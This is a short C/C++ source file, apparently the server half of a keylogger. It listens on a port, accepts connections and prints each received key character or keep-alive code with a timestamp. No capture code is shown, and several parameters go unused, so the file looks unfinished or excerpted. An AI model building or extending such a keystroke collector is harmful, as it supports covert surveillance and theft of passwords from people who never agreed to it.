#include <stdio.h>

#include "netcap_common.h"
#include "server_keylogger.h"

int server5(const char* appname, unsigned short port, 
           const char* dirname, int mode2, const char* winname, File &log)
{
	ServerSocket ssock;
	int ret = 0; 
	ret = ssock.open();
	ssock.setReuse(1);
	
	ret = ssock.bind(port);
	ret = ssock.listen();

	char timestr[1024];

	while(1) {
		ClientSocket cs;
		ret = ssock.accept(cs); // STOP
		printf("[%s] : client connected\n", get_time_stamp2(timestr));
		
		// 0. Check Okay
		char buf[2];
		ret = cs.recv(buf, 2);
		int a = (int)buf[0];
		if (ret == 2) { 
			if (buf[0] == 1) {
				printf("[%s] : recv keep alive code\n", get_time_stamp2(timestr));
			} else {
				printf("[%s] : recv '%c' key\n", get_time_stamp2(timestr), buf[0]);
			}
		} else {
			printf("[%s] : recv error\n", get_time_stamp2(timestr));
		}
		cs.close();
	} // end of while

  return 0;
}